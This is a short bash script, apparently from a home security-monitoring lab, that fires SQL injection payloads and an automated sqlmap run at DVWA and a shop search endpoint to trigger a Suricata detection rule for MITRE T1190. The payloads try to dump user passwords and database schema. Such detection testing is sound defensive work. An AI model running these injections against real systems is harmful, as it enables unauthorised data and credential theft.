#!/usr/bin/env bash
# Scénario T1190 — injection SQL (exploit public-facing app).
# Usage : ./sqli.sh <TARGET> [WEBPORT]
set -euo pipefail
TARGET="${1:-192.168.1.10}"
WEBPORT="${2:-8081}"
BASE="http://${TARGET}:${WEBPORT}"

echo "[*] Requêtes SQLi manuelles vers ${BASE} (déclenche custom.rules SID 1000005)"
# Quelques payloads classiques — visibles par Suricata dans l'URI HTTP.
for payload in \
  "/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  "/vulnerabilities/sqli/?id=1 UNION SELECT user,password FROM users--&Submit=Submit" \
  "/rest/products/search?q=')) UNION SELECT sql FROM sqlite_master--" \
  ; do
  curl -s -G "${BASE}${payload}" -o /dev/null -w "  -> %{http_code} %{url_effective}\n" || true
done

if command -v sqlmap >/dev/null 2>&1; then
  echo "[*] sqlmap (automatisé) sur le paramètre id de DVWA"
  sqlmap -u "${BASE}/vulnerabilities/sqli/?id=1&Submit=Submit" \
         --batch --level=2 --risk=2 --threads=4 || true
else
  echo "[i] sqlmap non installé (sudo apt install sqlmap) — payloads manuels uniquement."
fi

echo "[+] Terminé. Détection attendue : Suricata 'MINISOC WEBATTACK' (T1190)."
